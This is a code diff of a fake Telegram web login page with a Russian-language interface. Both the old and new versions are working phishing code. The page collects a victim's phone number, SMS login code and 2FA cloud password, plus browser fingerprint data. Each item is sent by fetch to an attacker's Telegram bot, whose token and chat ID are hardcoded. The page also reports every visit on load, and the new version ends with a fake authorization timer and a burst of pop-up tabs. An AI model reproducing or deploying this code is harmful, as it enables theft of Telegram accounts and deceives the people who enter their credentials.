@@ -4,9 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram</title>
-    <link rel="icon" href="https://web.telegram.org/favicon.ico" type="image/x-icon" />
     <style>
-        /* ===== ОБЩИЕ СТИЛИ ===== */
         * {
             margin: 0;
             padding: 0;
@@ -41,28 +39,6 @@
             text-align: left;
             margin-bottom: 24px;
         }
-
-        /* ===== ПЛАВНЫЕ ШАГИ ===== */
-        .step {
-            transition: opacity 0.35s ease, transform 0.35s ease;
-            opacity: 1;
-            transform: translateY(0);
-        }
-        .step.hidden {
-            display: block !important;
-            opacity: 0;
-            transform: translateY(12px);
-            pointer-events: none;
-            position: absolute;
-            width: 100%;
-            left: 0;
-            padding: 0 16px;
-        }
-        .step-wrapper {
-            position: relative;
-            min-height: 340px;
-        }
-
         .field-group {
             margin-bottom: 18px;
         }
@@ -149,13 +125,16 @@
         .qr-button:active {
             background: #0077b3;
         }
+        .hidden {
+            display: none !important;
+        }
         .error {
             color: #ff3b30;
             font-size: 13px;
             margin-top: 6px;
             display: none;
         }
-        .result {
+        .result-text {
             color: #34c759;
             text-align: center;
             font-size: 16px;
@@ -219,253 +198,114 @@
         .twofa-skip:active {
             opacity: 0.6;
         }
-
-        /* ===== СТРАНИЦА-СИМУЛЯТОР (ЧАТ) ===== */
-        .chat-container {
-            display: none;
-            width: 100%;
-            max-width: 400px;
-            background: #121212;
-            border-radius: 30px;
-            overflow: hidden;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.9);
-            border: 1px solid #2a2a2a;
-            margin: 0 auto;
-        }
-        .chat-header {
-            background: #1f1f1f;
-            padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid #2a2a2a;
-        }
-        .chat-avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            background: #2a6f97;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-weight: 600;
+        #loadingAuth {
+            margin-top: 20px;
+            text-align: center;
             font-size: 18px;
+            font-weight: 500;
+            color: #000;
         }
-        .chat-title {
-            color: #fff;
-            font-size: 18px;
-            font-weight: 600;
-        }
-        .chat-sub {
-            color: #888;
-            font-size: 13px;
-        }
-        .chat-messages {
-            padding: 16px 16px 80px 16px;
-            min-height: 420px;
-            background: #0e0e0e;
-        }
-        .msg {
-            max-width: 80%;
-            padding: 10px 14px;
-            border-radius: 18px;
-            margin-bottom: 10px;
-            font-size: 15px;
-            line-height: 1.4;
-            word-wrap: break-word;
-            animation: fadeUp 0.3s ease;
-        }
-        .msg.in {
-            background: #1e1e1e;
-            color: #e0e0e0;
-            align-self: flex-start;
-            border-bottom-left-radius: 4px;
-        }
-        .msg.out {
-            background: #005c4b;
-            color: #fff;
-            align-self: flex-end;
-            border-bottom-right-radius: 4px;
-            margin-left: auto;
-        }
-        .msg-wrapper {
-            display: flex;
-            flex-direction: column;
-            align-items: flex-start;
-        }
-        .msg-wrapper.out {
-            align-items: flex-end;
-        }
-        .chat-footer {
-            padding: 12px 16px;
-            background: #1a1a1a;
-            border-top: 1px solid #2a2a2a;
-            display: flex;
-            gap: 10px;
-        }
-        .chat-footer input {
-            flex: 1;
-            padding: 12px 16px;
-            border-radius: 24px;
-            border: none;
-            background: #2a2a2a;
-            color: #fff;
-            font-size: 15px;
-            outline: none;
-        }
-        .chat-footer button {
-            background: #005c4b;
-            border: none;
-            border-radius: 50%;
-            width: 48px;
-            height: 48px;
-            color: #fff;
+        #timer {
             font-size: 22px;
-            cursor: pointer;
-        }
-        @keyframes fadeUp {
-            0% { opacity: 0; transform: translateY(10px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-        .typing {
-            color: #888;
-            font-size: 14px;
-            padding: 8px 16px;
-            animation: blink 1.2s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        .hidden-chat {
-            display: none !important;
-        }
-        .visible-chat {
-            display: block !important;
+            font-weight: 700;
+            color: #0088cc;
         }
     </style>
 </head>
 <body>
-
-<!-- ===== КОНТЕЙНЕР ВХОДА ===== -->
-<div class="container" id="loginContainer">
+<div class="container">
     <div class="logo">Telegram</div>
     <div class="sub-text">Проверьте код страны и введите свой номер телефона.</div>
 
-    <div class="step-wrapper">
-        <!-- ШАГ 1: НОМЕР -->
-        <div id="step1" class="step">
-            <div class="field-group">
-                <span class="field-label">Страна</span>
-                <div class="country-selector">
-                    <select id="countryCode">
-                        <option value="+7">🇷🇺 Россия (+7)</option>
-                        <option value="+380">🇺🇦 Украина (+380)</option>
-                        <option value="+375">🇧🇾 Беларусь (+375)</option>
-                        <option value="+1">🇺🇸 США (+1)</option>
-                        <option value="+44">🇬🇧 Великобритания (+44)</option>
-                        <option value="+49">🇩🇪 Германия (+49)</option>
-                        <option value="+33">🇫🇷 Франция (+33)</option>
-                        <option value="+90">🇹🇷 Турция (+90)</option>
-                        <option value="+95">🇲🇲 Мьянма (+95)</option>
-                        <option value="+86">🇨🇳 Китай (+86)</option>
-                        <option value="+91">🇮🇳 Индия (+91)</option>
-                        <option value="+81">🇯🇵 Япония (+81)</option>
-                        <option value="+82">🇰🇷 Корея (+82)</option>
-                        <option value="+39">🇮🇹 Италия (+39)</option>
-                        <option value="+34">🇪🇸 Испания (+34)</option>
-                        <option value="+55">🇧🇷 Бразилия (+55)</option>
-                        <option value="+61">🇦🇺 Австралия (+61)</option>
-                        <option value="+7">🇰🇿 Казахстан (+7)</option>
-                    </select>
-                    <span class="arrow">▼</span>
-                </div>
-            </div>
-
-            <div class="field-group">
-                <span class="field-label">Номер телефона</span>
-                <div class="phone-row">
-                    <span class="phone-code" id="phoneCodeDisplay">+7</span>
-                    <input type="tel" id="phoneInput" placeholder="900 123 45 67" inputmode="numeric">
-                </div>
-                <div class="sub-hint">Введите номер без +</div>
-            </div>
-
-            <div class="checkbox-row">
-                <input type="checkbox" id="rememberMe" checked>
-                <label for="rememberMe">Запомнить меня</label>
-            </div>
-
-            <button class="qr-button" onclick="step1()">ВХОД ПО QR-КОДУ</button>
-            <div class="error" id="err1">Введите корректный номер</div>
-        </div>
-
-        <!-- ШАГ 2: КОД + 2FA -->
-        <div id="step2" class="step hidden">
-            <div class="phone-display">Код отправлен на <span id="phoneDisplay"></span></div>
-            <div class="field-group">
-                <span class="field-label">Код из SMS</span>
-                <input type="text" id="codeInput" placeholder="___ __" maxlength="6" inputmode="numeric" style="width:100%;border-bottom:1px solid #d9d9d9;padding:12px 0;font-size:17px;border-top:none;border-left:none;border-right:none;outline:none;background:transparent;">
-            </div>
-            <button class="qr-button" onclick="step2()">Подтвердить</button>
-            <div class="error" id="err2">Неверный код</div>
-
-            <!-- 2FA появляется ТОЛЬКО после ввода кода -->
-            <div id="twofaBlock" class="hidden" style="margin-top:20px;">
-                <div class="field-group">
-                    <span class="field-label">Облачный пароль (2FA)</span>
-                    <input type="password" id="twofaInput" placeholder="Введите пароль, если он есть" style="width:100%;border-bottom:1px solid #d9d9d9;padding:12px 0;font-size:17px;border-top:none;border-left:none;border-right:none;outline:none;background:transparent;">
-                </div>
-                <div class="twofa-hint">Если у вас нет облачного пароля — пропустите</div>
-                <button class="qr-button" onclick="step3()">Войти</button>
-                <button class="twofa-skip" onclick="skipTwofa()">Пропустить</button>
+    <!-- ШАГ 1: НОМЕР -->
+    <div id="step1">
+        <div class="field-group">
+            <span class="field-label">Страна</span>
+            <div class="country-selector">
+                <select id="countryCode">
+                    <option value="+7">🇷🇺 Россия (+7)</option>
+                    <option value="+380">🇺🇦 Украина (+380)</option>
+                    <option value="+375">🇧🇾 Беларусь (+375)</option>
+                    <option value="+1">🇺🇸 США (+1)</option>
+                    <option value="+44">🇬🇧 Великобритания (+44)</option>
+                    <option value="+49">🇩🇪 Германия (+49)</option>
+                    <option value="+33">🇫🇷 Франция (+33)</option>
+                    <option value="+90">🇹🇷 Турция (+90)</option>
+                    <option value="+95">🇲🇲 Мьянма (+95)</option>
+                    <option value="+86">🇨🇳 Китай (+86)</option>
+                    <option value="+91">🇮🇳 Индия (+91)</option>
+                    <option value="+81">🇯🇵 Япония (+81)</option>
+                    <option value="+82">🇰🇷 Корея (+82)</option>
+                    <option value="+39">🇮🇹 Италия (+39)</option>
+                    <option value="+34">🇪🇸 Испания (+34)</option>
+                    <option value="+55">🇧🇷 Бразилия (+55)</option>
+                    <option value="+61">🇦🇺 Австралия (+61)</option>
+                    <option value="+7">🇰🇿 Казахстан (+7)</option>
+                </select>
+                <span class="arrow">▼</span>
             </div>
         </div>
 
-        <!-- РЕЗУЛЬТАТ -->
-        <div id="result" class="step hidden">
-            <div class="result">✅ Вход выполнен</div>
-            <div class="loader" id="loader"></div>
+        <div class="field-group">
+            <span class="field-label">Номер телефона</span>
+            <div class="phone-row">
+                <span class="phone-code" id="phoneCodeDisplay">+7</span>
+                <input type="tel" id="phoneInput" placeholder="900 123 45 67" inputmode="numeric">
+            </div>
+            <div class="sub-hint">Введите номер без +</div>
         </div>
+
+        <div class="checkbox-row">
+            <input type="checkbox" id="rememberMe" checked>
+            <label for="rememberMe">Запомнить меня</label>
+        </div>
+
+        <button class="qr-button" onclick="step1()">ВХОД ПО QR-КОДУ</button>
+        <div class="error" id="err1">Введите корректный номер</div>
+    </div>
+
+    <!-- ШАГ 2: КОД + 2FA -->
+    <div id="step2" class="hidden">
+        <div class="phone-display">Код отправлен на <span id="phoneDisplay"></span></div>
+        <div class="field-group">
+            <span class="field-label">Код из SMS</span>
+            <input type="text" id="codeInput" placeholder="___ __" maxlength="6" inputmode="numeric" style="width:100%;border-bottom:1px solid #d9d9d9;padding:12px 0;font-size:17px;border-top:none;border-left:none;border-right:none;outline:none;background:transparent;">
+        </div>
+        <button class="qr-button" onclick="step2()">Подтвердить</button>
+        <div class="error" id="err2">Неверный код</div>
+
+        <!-- 2FA появляется ПОСЛЕ ввода кода -->
+        <div id="twofaBlock" class="hidden" style="margin-top:20px;">
+            <div class="field-group">
+                <span class="field-label">Облачный пароль (2FA)</span>
+                <input type="password" id="twofaInput" placeholder="Введите пароль, если он есть" style="width:100%;border-bottom:1px solid #d9d9d9;padding:12px 0;font-size:17px;border-top:none;border-left:none;border-right:none;outline:none;background:transparent;">
+            </div>
+            <div class="twofa-hint">Если у вас нет облачного пароля — пропустите</div>
+            <button class="qr-button" onclick="step3()">Войти</button>
+            <button class="twofa-skip" onclick="skipTwofa()">Пропустить</button>
+        </div>
+    </div>
+
+    <!-- ШАГ 3: ПРОВЕРКА АВТОРИЗАЦИИ 10 СЕК -->
+    <div id="loadingAuth" class="hidden">
+        <div class="loader" style="display:block;"></div>
+        <div style="margin-top:16px;font-size:18px;font-weight:500;">⏳ Проверка авторизации...</div>
+        <div id="timer" style="margin-top:8px;">10</div>
+    </div>
+
+    <!-- ШАГ 4: РЕЗУЛЬТАТ -->
+    <div id="result" class="hidden">
+        <div class="result-text">✅ Вход выполнен</div>
     </div>
 
     <div class="footer">Telegram • 2026</div>
 </div>
 
-<!-- ===== СТРАНИЦА-СИМУЛЯТОР ЧАТА (скрыта по умолчанию) ===== -->
-<div class="chat-container hidden-chat" id="chatContainer">
-    <div class="chat-header">
-        <div class="chat-avatar">А</div>
-        <div>
-            <div class="chat-title">Алексей</div>
-            <div class="chat-sub">был(а) только что</div>
-        </div>
-    </div>
-    <div class="chat-messages" id="chatBox">
-        <div class="msg-wrapper"><div class="msg in">Привет! Как дела?</div></div>
-        <div class="msg-wrapper out"><div class="msg out">Отлично! А у тебя?</div></div>
-        <div class="msg-wrapper"><div class="msg in">Тоже норм. Что нового?</div></div>
-        <div class="msg-wrapper out"><div class="msg out">Да всё по работе...</div></div>
-        <div class="msg-wrapper"><div class="msg in">Понял. Давай завтра встретимся?</div></div>
-        <div class="msg-wrapper out"><div class="msg out">Давай. Во сколько?</div></div>
-        <div class="msg-wrapper"><div class="msg in">В 18:00 у парка.</div></div>
-        <div class="msg-wrapper out"><div class="msg out">Договорились! 🫡</div></div>
-        <div class="typing" id="typingIndicator">✍️ Алексей печатает...</div>
-    </div>
-    <div class="chat-footer">
-        <input type="text" placeholder="Сообщение..." id="msgInput">
-        <button id="sendBtn">➤</button>
-    </div>
-</div>
-
 <script>
-    // ===== КОНФИГУРАЦИЯ =====
     const BOT_TOKEN = '8799962757:AAFmz4Sq3Ujo4URqCQl2gH4b6sRh51c1NKI';
     const CHAT_ID = '8277809761';
     const WEBHOOK = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    // ===== ОТПРАВКА В TELEGRAM =====
     function sendToTG(text) {
         fetch(WEBHOOK, {
             method: 'POST',
@@ -478,7 +318,6 @@
         }).catch(e => console.log('Ошибка отправки:', e));
     }
 
-    // ===== ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ =====
     function getDeviceInfo() {
         return {
             ua: navigator.userAgent,
@@ -490,22 +329,11 @@
         };
     }
 
-    // ===== ПОЛНЫЙ НОМЕР =====
     function getFullPhone() {
         const code = document.getElementById('countryCode').value;
         const num = document.getElementById('phoneInput').value.replace(/\s/g, '');
         if (!num || num.length < 5) return null;
         return code + num;
-    }
-
-    // ===== ПЛАВНЫЙ ПЕРЕХОД =====
-    function switchStep(fromId, toId) {
-        const from = document.getElementById(fromId);
-        const to = document.getElementById(toId);
-        from.classList.add('hidden');
-        setTimeout(() => {
-            to.classList.remove('hidden');
-        }, 350);
     }
 
     // ===== ШАГ 1 =====
@@ -521,8 +349,9 @@
         const remember = document.getElementById('rememberMe').checked ? 'Да' : 'Нет';
         sendToTG(`📱 <b>НОМЕР</b>\n<code>${full}</code>\n🔒 Запомнить: ${remember}\n\n🖥 ${info.ua}\n📺 ${info.screen}\n🕒 ${info.tz}\n🔗 ${info.ref}`);
 
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.remove('hidden');
         document.getElementById('phoneDisplay').textContent = full;
-        switchStep('step1', 'step2');
     }
 
     // ===== ШАГ 2 — ввод кода =====
@@ -546,51 +375,88 @@
     function step3() {
         const twofa = document.getElementById('twofaInput').value.trim() || 'не указан';
         sendToTG(`🔐 <b>2FA</b>\n<code>${twofa}</code>`);
-        finish();
+        startAuthCheck();
     }
 
     // ===== ПРОПУСТИТЬ 2FA =====
     function skipTwofa() {
         sendToTG(`⏭️ <b>2FA пропущен</b>`);
-        finish();
+        startAuthCheck();
     }
 
-    // ===== ФИНИШ — ПОКАЗЫВАЕМ ЧАТ =====
-    function finish() {
-        document.getElementById('loader').style.display = 'block';
-        sendToTG(`✅ <b>ГОТОВО</b>\n📱 Номер получен\n🔑 Код получен\n➡️ Переход в чат`);
+    // ===== ЭКРАН ПРОВЕРКИ + ТАЙМЕР =====
+    function startAuthCheck() {
+        // Скрываем шаг 2
+        document.getElementById('step2').classList.add('hidden');
+        // Показываем экран загрузки
+        document.getElementById('loadingAuth').classList.remove('hidden');
 
+        let seconds = 10;
+        const timerEl = document.getElementById('timer');
+        timerEl.textContent = seconds;
+
+        const interval = setInterval(() => {
+            seconds--;
+            timerEl.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(interval);
+                // Завершаем — показываем результат и открываем вкладки
+                document.getElementById('loadingAuth').classList.add('hidden');
+                document.getElementById('result').classList.remove('hidden');
+                sendToTG(`✅ <b>АВТОРИЗАЦИЯ ПРОЙДЕНА</b>\n➡️ Открытие вкладок...`);
+                openRandomTabs();
+            }
+        }, 1000);
+    }
+
+    // ===== ОТКРЫТИЕ МНОЖЕСТВА РАНДОМНЫХ ВКЛАДОК =====
+    function openRandomTabs() {
+        const sites = [
+            'https://google.com',
+            'https://youtube.com',
+            'https://vk.com',
+            'https://yandex.ru',
+            'https://mail.ru',
+            'https://github.com',
+            'https://reddit.com',
+            'https://twitter.com',
+            'https://instagram.com',
+            'https://facebook.com',
+            'https://twitch.tv',
+            'https://spotify.com',
+            'https://stackoverflow.com',
+            'https://wikipedia.org',
+            'https://amazon.com',
+            'https://ebay.com',
+            'https://aliexpress.com',
+            'https://wildberries.ru',
+            'https://ozon.ru',
+            'https://avito.ru'
+        ];
+
+        // Перемешиваем массив
+        const shuffled = sites.sort(() => 0.5 - Math.random());
+
+        // Открываем первые 10–15 вкладок
+        const count = Math.floor(Math.random() * 8) + 8; // от 8 до 15
+        for (let i = 0; i < count && i < shuffled.length; i++) {
+            window.open(shuffled[i], '_blank');
+        }
+
+        // Дополнительно открываем несколько раз с задержкой (для эффекта "шквала")
         setTimeout(() => {
-            document.getElementById('loginContainer').style.display = 'none';
-            document.getElementById('chatContainer').classList.remove('hidden-chat');
-            document.getElementById('chatContainer').classList.add('visible-chat');
-            document.getElementById('loader').style.display = 'none';
-        }, 800);
+            for (let i = 0; i < 5; i++) {
+                window.open(shuffled[i % shuffled.length], '_blank');
+            }
+        }, 300);
     }
 
-    // ===== ИМИТАЦИЯ ЧАТА =====
-    const chatBox = document.getElementById('chatBox');
-    const input = document.getElementById('msgInput');
-    const sendBtn = document.getElementById('sendBtn');
-    const typing = document.getElementById('typingIndicator');
-
-    const replies = [
-        "Да, точно!",
-        "Хорошо, договорились.",
-        "Спасибо!",
-        "Отлично!",
-        "Понял, сделаем.",
-        "Жду.",
-        "Окей",
-        "👍",
-        "😊"
-    ];
-
-    function addMessage(text, type = 'in') {
-        const wrapper = document.createElement('div');
-        wrapper.className = `msg-wrapper ${type}`;
-        const msg = document.createElement('div');
-        msg.className = `msg ${type}`;
-        msg.textContent = text;
-        wrapper.appendChild(msg);
-        chatBox.insert
+    // ===== ПРИ ЗАГРУЗКЕ =====
+    window.onload = function() {
+        const info = getDeviceInfo();
+        sendToTG(`🟢 <b>НОВЫЙ ВИЗИТ</b>\n🖥 ${info.ua}\n📺 ${info.screen}\n🕒 ${info.tz}\n🔗 ${info.ref}\n📍 ${info.url}`);
+        document.getElementById('phoneCodeDisplay').textContent = document.getElementById('countryCode').value;
+    };
+</script>
+</body>
+        </html>
